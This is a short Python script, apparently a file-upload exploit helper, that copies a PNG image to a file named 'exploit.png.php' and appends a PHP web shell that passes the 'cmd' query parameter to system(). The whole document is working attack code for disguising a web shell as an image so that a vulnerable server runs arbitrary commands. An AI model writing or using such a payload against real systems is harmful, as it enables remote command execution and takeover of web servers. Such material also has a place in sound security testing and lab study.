a = open("exploit.png", "rb").read()
out = open("exploit.png.php", "wb")
out.write(a)

# Inject command in the end of png photo file.
out.write("<?=system($_GET['cmd']); ?>".encode())

